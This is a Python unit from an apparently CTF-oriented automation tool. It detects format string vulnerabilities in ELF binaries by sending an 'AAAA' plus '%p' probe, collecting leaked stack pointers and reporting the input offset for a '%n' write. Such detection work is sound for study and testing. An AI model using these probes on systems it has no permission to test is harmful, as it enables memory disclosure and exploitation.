"""
Format string vulnerability detection.

This unit detects format string vulnerabilities in ELF binaries by
sending format string specifiers (%x, %p, %s, %n) and checking
if the program leaks stack data.

Common vulnerability in CTF pwn challenges.
"""

import os
import stat
from typing import Any

from flagr.unit import NotApplicable
from flagr.units.pwn import PwnUnit


class Unit(PwnUnit):

    GROUPS = ["pwn", "elf", "formatstring", "exploit"]
    PRIORITY = 25
    RECURSE_SELF = False
    NO_RECURSE = True

    def __init__(self, *args, **kwargs):
        super(Unit, self).__init__(*args, **kwargs)

        try:
            from pwn import ELF
            self._elf = ELF(self.target.path, checksec=False)
        except Exception:
            raise NotApplicable("could not parse ELF")

        # Check if printf is used (likely format string target)
        if "printf" not in self._elf.plt and "fprintf" not in self._elf.plt:
            raise NotApplicable("no printf in PLT")

    def evaluate(self, case: Any):
        """
        Test for format string vulnerability by sending %p patterns
        and checking for leaked stack data.
        """
        os.environ["PWNLIB_NOTERM"] = "1"
        from pwn import process, context

        context.binary = self._elf
        context.log_level = "error"

        st = os.stat(self.target.path)
        os.chmod(self.target.path, st.st_mode | stat.S_IEXEC)

        try:
            # Test with %p to leak stack pointers
            p = process(self.target.path)
            test_payload = b"AAAA" + b".%p" * 20
            p.sendline(test_payload)

            try:
                output = p.recvall(timeout=3)
            except Exception:
                output = b""
            finally:
                p.close()

            if not output:
                return

            output_str = output.decode("utf-8", errors="replace")

            # Check if we got hex pointer leaks (0x7fff..., 0x5555..., etc.)
            import regex as re
            pointers = re.findall(r"0x[0-9a-fA-F]{6,16}", output_str)

            if len(pointers) >= 3:
                lines = [
                    "=== Format String Vulnerability Detected ===",
                    f"  Binary: {self.target.path}",
                    f"  Leaked {len(pointers)} stack pointers:",
                ]
                for i, ptr in enumerate(pointers[:10]):
                    lines.append(f"    %{i+1}$p = {ptr}")

                # Check if AAAA (0x41414141) appears in the leaks
                for i, ptr in enumerate(pointers):
                    if "41414141" in ptr:
                        lines.append(f"  [!] Input found at offset {i+1} (%%{i+1}$n for write)")
                        break

                result = "\n".join(lines)
                self.manager.register_data(self, result)

                # Also register raw output for flag searching
                self.manager.register_data(self, output)

        except Exception:
            pass
